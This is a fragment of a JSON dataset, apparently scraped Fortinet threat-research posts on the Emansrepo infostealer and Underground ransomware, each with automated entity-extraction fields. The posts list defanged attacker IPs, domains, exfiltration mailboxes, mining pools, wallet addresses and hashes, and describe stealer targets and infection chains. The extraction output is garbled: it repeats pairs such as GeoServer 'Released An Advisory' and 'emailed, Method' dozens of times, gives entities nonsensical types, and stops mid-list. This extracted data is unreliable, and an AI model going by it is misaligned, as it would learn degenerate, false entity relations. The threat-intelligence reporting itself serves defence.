181[.]214[.]58[.]14:1820147[.]253[.]46[.]11secure[.]systemupdatecdn[.]de188[.]214[.]27[.]50bots[.]gxz[.]me209[.]146[.]124[.]181sdfasdfsf[.]9527527[.]xyz:3333gsdasdfadfs[.]9527527[.]xyz:3333pool[.]supportxmr[.]com:8095[.]85[.]93[.]196:4443pool[.]supportxmr[.]com:333359[.]59[.]59[.]59 49VQVgmN9vYccj2tEgD7qgJPbLiGQcQ4uJxTRkTJUCZXRruR7HFD7keebLdYj6Bf5xZKhFKFANFxZhj3BCmRT9pe4NG325b+5000041qqpRxT7ocGsbZPeU9JcbfRiHLy3j8DWhdKzv8Yr2VS1QPcFLmfHVJFWEBDfWaB3N6HxuVuAb73nES36bN2rhevGnZ12nA b80e9466b7bb42959c29546b8c052e67fcaa0f591857617457d5d28348bd8860d9e8b390f8e2e8a6c2308c723a6a812f59c055ecad4e9098a120e5c4c65d390579c9532fb6ef2742e207498bfe2b2ee09aa9773376ac0e56085083aab17b98be5cc7e35254347f705422800bfb7fe29c6002e2537f6bac0ff996a720dfb5f48efabbb4611fb9df5d8f208d9353be0b73c3942fe78903da096cbfe2f47c9e35661588bee7db42495ba7e6e34d217e6b82c5ab93f27c1eea68435cbb9e7792f9bee8b0f5a952f07c83c4d67809ac0715c7164d518323d8038542e84aab8456db433c73ebc7a85accc65c9ee5bf151f70b990e5a12f27a843ca21c0f9d9a10fd17d9bf642a7e14f0a0b0a784f00a0d1cf590ac60ae5ae378d29d435519f4d9dbf2b994b924b00fb56e12a6a987c4cdf65dd05a221c47b5fc0a7a2babf1f05c2ed38c226744b40e8f5d2cf95b4fb2537ff00e222ecc2d24c5096ecfadb14b4a47f9796cf27a66b629d2b19708c6887441a8422b40dc0e9e7c5c0f2212efe0b6b3323b3a015b6650ec9800fa878ff9a5f732013806c8dcb0e7069515dae0dd380fda450b7e615b8cdc45486b6ed1c1c081c7a92c262edb84318fa864531dcab753f82f7b97677b6387c1f02d429e98868bf6973a8dec14dfee2516a27e885d6b1c780b60d7fb66caf103a04e81fb89dbb05111b4b0ef513f3769c8e0a8106ab01a075a9e7b5284182d3881c865895ee6e0fb03273eec3dcbf4bfc82dd2b069245beaec3101b0b74d76a95ba91b6cc4945657e928d2dac8fdf926ffbf09031d46e9186b67ab1b9b66fdc2c4ed1689698a54a347c2bdd6eaff87039ae337675243670d883fb74bb852bbd722e6ebc4e249e49cb4bb4194493a26d62d4bfcdfca299841253994a35a57970dea48e97009f65ad045b69a83234b771b106446211376a6866f3d3572ef96c9c59e137425ca6804e1b86b7f8b57210a3724d567017460774de1af8e068aa7377f0055640af581a412aa9d7288c912a93dd0d739657af0079fb1abd8cbd64d1d9c8d56b7ea6273ed62e1471f300fabc67dbc2416a48e2faf33daddccd0ecb643251af2e79e878b19a8e9c8f1c87302e732ef057cdba821f4b30d9dfe98b5fba09e17dbe29dfeb8deb7d777d4a3b0d670914691ed360b916116ad9dfe98b5fba09e17dbe29dfeb8deb7d777d4a3b0d670914691ed360b916116a8d3440301bc94ed83cdafb69e4b0166d3a0020eb4f38e9fa159c2f13f14b2d29a13a979f4ca57450528bb6cd7aa2bf47d2eea211053eb1a14b8c4a44fd6618317194ec436231c2a383ffc7c75eef4f5b5a952c18fa176ffd0830667835a8053320d97f144bf7b1662a13ac537715126b9b2f68eff46a4a09234743ae236f0177d72e4cabffc84a31e50caf827b6e579cf6e4932e5cbc528a65a68728ba56b65b5abf8a52d45f6d5970fab8d1dfd05b6ee7b0ef57df935f45761b89d3522fa59224e80d66759b1c7a075aeb4fe0321eb6ac49eaf509089fd2882874ec6228d0857355cc094f2e43e4dd7b8b698b559abe6d2d74cc48f5cfa464424314c6e41944689504850db842365cd47eadd2d3d42888b9261e7d9e884f14bb7deeb21bb61d762707f2c7fc4731c4c46ecb3364a4e7ace8984aa899cc57c624b342d3efa03f4234eb5eb42fbe44d7163c4388d263b3fe57fb1e56bf56152ac352c3fd0beec0373734730d8414d32883ebbd105c7a7c58397df995759c4e0bd367f2523d302dd1d25730122f8bc125251832c6af03aedd705dfcc2d9eebcce4371c54bb84b393dce929b1c091abac3342788624f1ffa4be5d603eec4d7ab39b604694ac05d22eb2f95bb2059a3690259f2c0d7537b3cad858869650b9c220d2d81e3720b6dde2e0e324e36fafe71f5d2bcf521e6415dafbc3f1173ad77f1f3daa77bb581da5f5d9eb83b4a6f2d49580e1658263eb972be336a2cad15a84561d17d59391191b075d7b6264f5a574bc75400c9d57282e9344d8b2df576ad2a36ab7e2575d5a395e5e5122ba6d0b06f7ed8e57ab5324ae730970c0d23913f27b9ecc9094182c03d275302d03a4378f1b852e6d783d3181c2899ae0e9ebad4c7160221320863c425653a4ad0b00e59a01142f899b6aac9712cfb25063b5b9b2e7e3171f7f3a897ed8fad39ec0671d9b401712ddbc1f24942b2ee2f4865b6ffcd2f019036e03cbadec8b76b63644d2946fd0af72b48fa59f07a78e1f84464cff5e9b1ca4110e6113e3928c5874249cc71b2d88e5c0c00989ac394238747bb7638897fc210531b4aab7d052cffcf97b303d11c5d35fa9bc860155601cdea21e38447401571b35d2db1c81d4770e812ddc883ead8ff41fd2e5a7d5bc8056521219ccf8784219d1bd819bf56711bbe0b1dac3b1481d36e7ae2f312da5f404c554c2c45a01fe591b8464d5c9722d3dc72dbeafec00256887867bad46d347a5fc797d57fc9e0fd317035d33369ddc627282eb38346e1a56118026dd3ccdb29b18ffff88ecf3663296ee6da Cara Lin FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (GeoServer, Tool), (GeoServer, Vulnerability), (GeoServer, Threat Type), (GeoServer, Associated With), (GeoServer, Deployed By), (GeoServer, Targeted By), (GeoServer, Installed On), (GeoServer, Used For), (GeoServer, Written In), (GeoServer, Implemented By), (GeoServer, Reference Implementation Of), (GeoServer, Standard), (GeoServer, Released An Advisory), (GeoServer, Released An Advisory), (GeoServer, Released An Advisory), (GeoServer, Released An Advisory), (GeoServer, Released An Advisory), (GeoServer, Released An Advisory), (GeoServer, Released An Advisory), (GeoServer, Released An Advisory), (GeoServer, Released An Advisory), (GeoServer, Released An Advisory), (GeoServer, Released An Advisory), (GeoServer, Released An Advisory), (GeoServer, Released An Advisory), (GeoServer, Released An Advisory), (GeoServer, Released An Advisory), (GeoServer, Released An Advisory), (GeoServer, Released An Advisory), (GeoServer, Released An Advisory), (GeoServer, Released An Advisory), (GeoServer, Released An Advisory), (GeoServer, Released An Advisory), (GeoServer, Released An Advisory), (GeoServer, Released An Advisory), (GeoServer, Released An Advisory), (GeoServer, Released An Advisory), (GeoServer,",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "GeoServer",
          "Tool"
        ],
        [
          "GeoServer",
          "Vulnerability"
        ],
        [
          "GeoServer",
          "Threat Type"
        ],
        [
          "GeoServer",
          "Associated With"
        ],
        [
          "GeoServer",
          "Deployed By"
        ],
        [
          "GeoServer",
          "Targeted By"
        ],
        [
          "GeoServer",
          "Installed On"
        ],
        [
          "GeoServer",
          "Used For"
        ],
        [
          "GeoServer",
          "Written In"
        ],
        [
          "GeoServer",
          "Implemented By"
        ],
        [
          "GeoServer",
          "Reference Implementation Of"
        ],
        [
          "GeoServer",
          "Standard"
        ],
        [
          "GeoServer",
          "Released An Advisory"
        ],
        [
          "GeoServer",
          "Released An Advisory"
        ],
        [
          "GeoServer",
          "Released An Advisory"
        ],
        [
          "GeoServer",
          "Released An Advisory"
        ],
        [
          "GeoServer",
          "Released An Advisory"
        ],
        [
          "GeoServer",
          "Released An Advisory"
        ],
        [
          "GeoServer",
          "Released An Advisory"
        ],
        [
          "GeoServer",
          "Released An Advisory"
        ],
        [
          "GeoServer",
          "Released An Advisory"
        ],
        [
          "GeoServer",
          "Released An Advisory"
        ],
        [
          "GeoServer",
          "Released An Advisory"
        ],
        [
          "GeoServer",
          "Released An Advisory"
        ],
        [
          "GeoServer",
          "Released An Advisory"
        ],
        [
          "GeoServer",
          "Released An Advisory"
        ],
        [
          "GeoServer",
          "Released An Advisory"
        ],
        [
          "GeoServer",
          "Released An Advisory"
        ],
        [
          "GeoServer",
          "Released An Advisory"
        ],
        [
          "GeoServer",
          "Released An Advisory"
        ],
        [
          "GeoServer",
          "Released An Advisory"
        ],
        [
          "GeoServer",
          "Released An Advisory"
        ],
        [
          "GeoServer",
          "Released An Advisory"
        ],
        [
          "GeoServer",
          "Released An Advisory"
        ],
        [
          "GeoServer",
          "Released An Advisory"
        ],
        [
          "GeoServer",
          "Released An Advisory"
        ],
        [
          "GeoServer",
          "Released An Advisory"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 38,
    "relationship_count": 0
  },
  {
    "title": "Emansrepo Stealer: Multi-Vector Attack Chains",
    "link": "https://www.fortinet.com/blog/threat-research/emansrepo-stealer-multi-vector-attack-chains",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High In August 2024, FortiGuard Labs observed a python infostealer we call Emansrepo that is distributed via emails that include fake purchase orders and invoices. Emansrepo compresses data from the victim’s browsers and files in specific paths into a zip file and sends it to the attacker’s email. According to our research, this campaign has been ongoing since November 2023. The attacker sent a phishing mail containing an HTML file, which was redirected to the download link for Emansrepo. This variant is packaged by PyInstaller so it can run on a computer without Python. As time goes by, the attack flow has become increasingly complex. Below are the attack flows we found in July and August 2024: Various stages are being added to the attack flow before downloading Emansrepo, and multiple mailboxes are used to receive different kinds of stolen data. This article will provide a detailed analysis of each attack chain and its behavior. We will then provide a quick summary of the next campaign. The attachment is a dropper that mimics a download page. It creates a link element that points to the data of Purchase-Order.7z and uses the click() method to “download” Purchase-Order.7z. Six seconds later, it redirects to a completely unrelated website. Purchase-Order.exe, the file embedded in Purchase-Order.7z, is an AutoIt-compiled executable. It doesn’t include any files, and the AutoIt script determines its behavior. The script has many unused functions, frustrating its analysis. The only meaningful code downloads preoffice.zip to the Temp folder and unzips it into % TEMP%\\PythonTemp. The zip archive contains necessary Python modules and tester.py, the malicious script for information stealing. The innermost file in P.O.7z is an HTA file. Its source file is a JavaScript file that shows a hidden window named PowerShell Script Runner and downloads the PowerShell script, script.ps1, with VBScript for the next stage. The behavior of script.ps1 is similar to the AutoIt script in chain 1. It downloads preoffice.zip to the Temp folder and unzips it to %TEMP%\\PythonTemp, but it executes Emansrepo using run.bat. The 7z file from the link in the phishing mail contains a batch file obfuscated by BatchShield. After deobfuscation, we can see that it is not as complicated as it first seems. It simply downloads and executes script.ps1 using PowerShell. According to the email receiving the data, the infostealer behavior can be divided into three parts. It creates folders to temporarily store the stolen data for each part and deletes them after sending the data to the attacker. The stolen data is attached to the email sent to the attacker. In part 1, the Python stealer collects login data, credit card information, web history, download history, autofill, and text files (less than 0.2 MB) from the Desktop, Document, and Downloads folders. Sender minesmtp8714@maternamedical[.]top Receiver minestealer8412@maternamedical[.]top Target Browsers amigo, torch, kometa, orbitum, cent-browser, 7star, sputnik, vivaldi, google-chrome-sxs, google-chrome, epic-privacy-browser, microsoft-edge, uran, yandex, brave, iridium Folder and files %TEMP%\\Browsers: Text files (less than 0.2 MB) copied from Desktop, Document, Downloads %TEMP%\\Browsers\\{browser name}: Saved_Passwords.txt, Saved_Credit_Cards.txt, Browser_History.txt, Download_History.txt, Autofill_Data.txt Attachment Zip file of%TEMP%\\Browsersfolder Part 1 includes the initial features of Emansrepo since there is only code for part 1 in the November 2023 variant (e346f6b36569d7b8c52a55403a6b78ae0ed15c0aaae4011490404bdb04ff28e5). It’s worth noting thatemans841 reporthas been used as the divider in Saved_Passwords.txt since the December 2023 variant (ae2a5a02d0ef173b1d38a26c5a88b796f4ee2e8f36ee00931c468cd496fb2b5a). Because of this, we call it Emansrepo. The variant used in November 2023 usesPrysmax Premiumas the divider. By comparing the variant in November 2023 with the first edition of the Prysmax stealer shared on GitHub, we find they contain many similar functions, though the Emansrepo stealer had fewer features. However, as parts 2 and 3 were added to Emansrepo, it has become quite different from the Prysmax stealer. Part 2 copies PDF files (less than 0.1 MB) from the Desktop, Document, Downloads, and Recents folders and compresses folders of browser extensions, crypto wallets, and game platforms into zip files. Sender extensionsmtp@maternamedical[.]top Receiver filelogs@maternamedical[.]top Target Browsers Opera, Chrome, Brave, Vivaldi, Yandex, Edge Crypto wallet Atomic Wallet, Guarda, Zcash, Armory, Bytecoin, Exodus, Binance, Electrum, Coinomi, jaxx Game platform Steam, Riot Games Browser extension MetaMask, BNB Chain Wallet, Coinbase Wallet, Ronin Wallet, Trust Wallet, Venom Wallet, Sui Wallet, Martian Aptos & Sui Wallet, TronLink, Petra Aptos Wallet, Pontem Crypto Wallet, Fewcha Move Wallet, Math Wallet, Coin98 Wallet, Authenticator, Exodus Web3 Wallet, Phantom, Core | Crypto Wallet & NFT, TokenPocket - Web3 & Nostr Wallet, SafePal Extension Wallet, Solflare Wallet, Kaikas, iWallet, Yoroi, Guarda, Jaxx Liberty, Wombat, Oxygen - Atomic Crypto Wallet, MEW CX, GuildWallet, Saturn Wallet, Station Wallet, Harmony, EVER Wallet, KardiaChain Wallet, Pali Wallet, BOLT X, Liquality Wallet, XDEFI Wallet, Nami, MultiversX Wallet, Temple - Tezos Wallet, XMR.PT Folder and files in temp folder %TEMP%\\pdf_temps: PDF files (less than 0.1 MB) copied from Desktop, Document, Downloads and Recents folder {extension ID}.zip {data folder}.zip Attachment All files in pdf_temp Part 3 copies cookie files and zips it into {process_name}_cookies.zip. Sender cookiesmtp@maternamedical[.]top Receiver cooklielogs@maternamedical[.]top Target Browsers Chrome, msedge, brave, opera, 360se, 360browser, yandex, UCBrowser, QQBrowser Folder and files in temp folder %TEMP%\\cookies_data: {process_name}_cookies.zip Zip file Zip files in cookies_data We recently found another attack campaign using the Remcos malware, which we believe is related to the same attacker because of the phishing email. As the above screenshot shows, these attacks have the same content but use different methods to distribute malware. The attack flow for Remcos is much simpler. The attacker just sends phishing emails with a malicious attachment. The attachment is a DBatLoader, which downloads and decrypts data for the payload. The payload is a Remcos protected by a packer. Emansrepo has been active since at least last November, and the attack method is continuously evolving. The attack vectors and malware are ever-changing and pervasive, so it’s vital for organizations to maintain cybersecurity awareness. FortiGuard will continue monitoring these attack campaigns and providing appropriate protections as required. The malware described in this report is detected and blocked by FortiGuard Antivirus as: W32/Kryptik.EB!trJS/Agent.FEI!trBAT/Downloader.2C22!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. The FortiGuard CDR (content disarm and reconstruction) service can disarm the embedded link object inside the Excel document. To stay informed of new and emerging threats, you cansign upto receive future alerts. We also suggest our readers go through the freeFortinet Cybersecurity Fundamentals (FCF) training, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxps://bafybeigm3wrvmyw5de667rzdgdnct2fvwumyf6zyzybzh3tqvv5jhlx2ta[.]ipfs[.]dweb[.]link/wetrankfr[.]ziphxxps://bafybeifhhbimsau6a6x4m2ghdmzer5c3ixfztpocqqudlo4oyzer224q4y[.]ipfs[.]w3s[.]link/myscr649612[.]jshttps://estanciaferreira[.]com[.]br/wp-includes/TIANJIN-DOC-05082024-xls[.]7zhxxps://dasmake[.]top/reader/timer[.]phphxxps://hedam[.]shop/simple/Enquiry.7z191[.]101[.]130[.]185192[.]236[.]232[.]35 stealsmtp@dasmake[.]xyzhanbox@dasmake[.]xyzpublicsmtp@dasmake[.]xyzpublicbox@dasmake[.]xyzminesmtp8714@dasmake[.]xyzminestealer8412@dasmake.xyzminesmtp8714@maternamedical[.]topminestealer8412@maternamedical[.]topextensionsmtp@maternamedical[.]topfilelogs@maternamedical[.]topcookiesmtp@maternamedical[.]topcooklielogs@maternamedical[.]top a6c2df5df1253f50bd49e7083fef6cdac544d97db4a6c9c30d7852c4fd6519219e5580d7c3c22e37b589ec8eea2dae423c8e63f8f666c83edabecf70a0948b999bd3b8d9ac6ad680b0d0e39b82a439feedd87b9af580f37fa3d80d2c252fef8c915bad0e2dbe0a18423c046f84d0ff7232fff4e5ba255cc710783f6e4929ab3264e5c9e7b8dfb8ca8ca73895aa51e585fa7e5414f0e1d10659d3a83b9f770333b343cce5381b8633b3fd3da56698f60db70c75422e120235a00517d519e37d8d32bcbce53bfee33112b447340e7114d6d46be4ccf1a5391ad685431afdc8fb86 bee8da411e71547ac765a5e63e177b59582df438432cc3b540b57a6f1a56dd1670ba3d67b476e98419ecbbbb5d81efcb5a07f55a92c96e7b9207176746e3b7a6a2fa6790035c7af64146158f1ed20cb54f4589783e1f260a5d8e4f30b81df70d4cd8c9fa7f5e2484b73ed9c7be55aa859969c3f21ca2834610102231d337841d6670e5c7521966e82d091e7adff4e16335f03f2e2740b653adcc9bfe35c7bf9bdd656953a6844dd9585f05545a513c4e8c2ded13e06cdb67a0e58eda7575a7a49866934dd2b4e411cdabaa7a96a63f153921a6489f01b0b40d7febed48b02c22 e346f6b36569d7b8c52a55403a6b78ae0ed15c0aaae4011490404bdb04ff28e58e43c97e5bc62211b3673dee13e376a1f5026502ebe9fd9f7f455dc17c253b7fae2a5a02d0ef173b1d38a26c5a88b796f4ee2e8f36ee00931c468cd496fb2b5a7a9826be22b6d977d6a0e5179f84d8e88b279fe6d9df8f6c93ebc40a6ba70f0618459be33cd4f59081098435a0fbaa649f301f985647a75d21b7fc337378e59b6e7313b6aa37a00b602e620a25a0b71a74503ea967f1814c6c7b8b192535a043222dd76c461e70c3cb330bacfcf465751b07331c4f8a4415c09f4cd7c4e6fcd96e7313b6aa37a00b602e620a25a0b71a74503ea967f1814c6c7b8b192535a043 infostealer,security attack FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (Threat Research, Threat Type), (Emansrepo, Malware), (Purchase-Order.7z, File), (Purchase-Order.exe, File), (HTML file, File), (emailed, Method), (PyInstaller, Tool), (November 2023, Time Period), (July 2024, Time Period), (August 2024, Time Period), (Python, Language), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (emailed, Method), (",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "Threat Research",
          "Threat Type"
        ],
        [
          "Emansrepo",
          "Malware"
        ],
        [
          "Purchase-Order.7z",
          "File"
        ],
        [
          "Purchase-Order.exe",
          "File"
        ],
        [
          "HTML file",
          "File"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "PyInstaller",
          "Tool"
        ],
        [
          "November 2023",
          "Time Period"
        ],
        [
          "July 2024",
          "Time Period"
        ],
        [
          "August 2024",
          "Time Period"
        ],
        [
          "Python",
          "Language"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ],
        [
          "emailed",
          "Method"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 45,
    "relationship_count": 0
  },
  {
    "title": "Ransomware Roundup - Underground",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-underground",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Underground ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft WindowsImpact:Encrypts victims' files and demands ransom for file decryptionSeverity level:High The first sample of Underground ransomware was first observed in early July 2023, on a publicly available file scanning site. This roughly coincides with the timing of the first victim posted on its data leak site on July 13, 2023. Like most ransomware, this ransomware encrypts files on victims' Windows machines and demands a ransom to decrypt them via dropped ransom notes. Online reports indicate that the Russia-based RomCom group, also known as Storm-0978, is deploying the Underground ransomware. This threat group is known to exploit CVE-2023-36884 (Microsoft Office and Windows HTML RCE Vulnerability), which could be the infection vector for the ransomware. FortiGuard Labs published an Outbreak Alert on CVE-2023-36884 on July 13, 2024. The group may also use other common infection vectors such as email and purchasing access from an Initial Access Broker (IAB). Once executed, the Underground ransomware deletes shadow copies with the following command: The ransomware sets the maximum time that a RemoteDesktop/TerminalServer session can remain active on the server to 14 days (14 days after the user disconnects) using the following command: It then stops the MS SQL Server service with the following command: The ransomware then creates and drops a ransom note named “!!readme!!!.txt”: While the ransomware encrypts files, it does not change or append file extensions. It also avoids encrypting files with the following extensions: .sys .exe .dll .bat .bin .cmd .com .cpl .gadget .inf1 .ins .inx .isu .job .jse .lnk .msc .msi .mst .paf .pif .ps1 .reg .rgs .scr .sct .shb shs .u3p .vb .vbe .vbs .vbscript .ws .wsh .wsf The ransomware creates and executes temp.cmd, which performs the following actions: The Underground ransomware has a data leak site that posts victim information, including data stolen from victims. Currently, the data leak site lists 16 victims, with the most recent victim posted on July 3, 2024. Below is a breakdown of the victims and their verticals: Post Date Location of Victim Vertical 2024/07/03 USA Construction 2024/07/01 France Pharmaceuticals 2024/06/17 USA Professional Services 2024/05/27 USA Banking 2024/05/15 USA Medicine 2024/05/01 USA Industry 2024/04/09 USA Business Services 2024/04/09 USA Construction 2024/03/25 USA Manufacturing 2024/03/06 Korea Manufacturing 2024/02/12 Spain Manufacturing 2024/02/02 Germany Industry 2023/07/31 Slovakia Business Services 2024/07/18 Taiwan Industry 2024/07/18 Singapore Manufacturing 2024/07/14 Canada Manufacturing The data leak site also includes a drop-down box with a list of industries that the ransomware group is targeting or is allowed to target. The Underground ransomware group also has a Telegram channel that was created on March 21, 2024. According to the Telegram channel, the ransomware group has made victims' stolen information available on Mega, a cloud storage service provider that is being abused. The Underground ransomware described in this report is detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. Please read the outbreak alert for protection against the potential infection vector (CVE-2023-36884) abused by the Underground ransomware: Underground Ransomware File IOCs SHA2 Note 9543f71d7c4e394223c9d41ccef71541e1f1eb0cc76e8fa0f632b8365069af64 Underground ransomware 9f702b94a86558df87de316611d9f1bfe99a6d8da9fa9b3d7bb125a12f9ad11f eb8ed3b94fa978b27a02754d4f41ffc95ed95b9e62afb492015d0eb25f89956f 9d41b2f7c07110fb855c62b5e7e330a597860916599e73dd3505694fd1bbe163 cc80c74a3592374341324d607d877dcf564d326a1354f3f2a4af58030e716813 d4a847fa9c4c7130a852a2e197b205493170a8b44426d9ec481fc4b285a92666 Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (Ransomware Roundup, Report), (Underground ransomware, Threat Type), (Windows, Platform), (RomCom group, Attacker), (CVE-2023-36884, Vulnerability), (email, Technique), (IAB, Technique), (Outbreak Alert, Tool), (July 13, 2023, Date), (July 13, 2024, Date)\nRelationships: (FortiGuard Labs, publishes, Ransomware Roundup), (Ransomware Roundup, contains, Underground ransomware), (Underground ransomware, uses, email), (Underground ransomware, uses, IAB), (Underground ransomware, infects, Windows), (Underground ransomware, employs, CVE-2023-36884), (Underground ransomware, launchedBy, RomCom group)",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "Ransomware Roundup",
          "Report"
        ],
        [
          "Underground ransomware",
          "Threat Type"
        ],
        [
          "Windows",
          "Platform"
        ],
        [
          "RomCom group",
          "Attacker"
        ],
        [
          "CVE-2023-36884",
          "Vulnerability"
        ],
        [
          "email",
          "Technique"
        ],
        [
          "IAB",
          "Technique"
        ],
        [
          "Outbreak Alert",
          "Tool"
        ],
        [
          "July 13",
          "2023",
          "Date"
        ],
        [
          "July 13",
          "2024",
          "Date"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "publishes",
          "Ransomware Roundup"
        ],
        [
          "Ransomware Roundup",
          "contains",
          "Underground ransomware"
        ],
        [
          "Underground ransomware",
          "uses",
          "email"
        ],
        [
          "Underground ransomware",
          "uses",
          "IAB"
        ],
        [
          "Underground ransomware",
          "infects",
          "Windows"
        ],
        [
          "Underground ransomware",
          "employs",
          "CVE-2023-36884"
        ],
        [
          "Underground ransomware",
          "launchedBy",
          "RomCom group"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 11,
    "relationship_count": 7
  },
  {
    "title": "Deep Analysis of Snake Keylogger’s New Variant",
    "link": "https://www.fortinet.com/blog/threat-research/deep-analysis-of-snake-keylogger-new-variant",
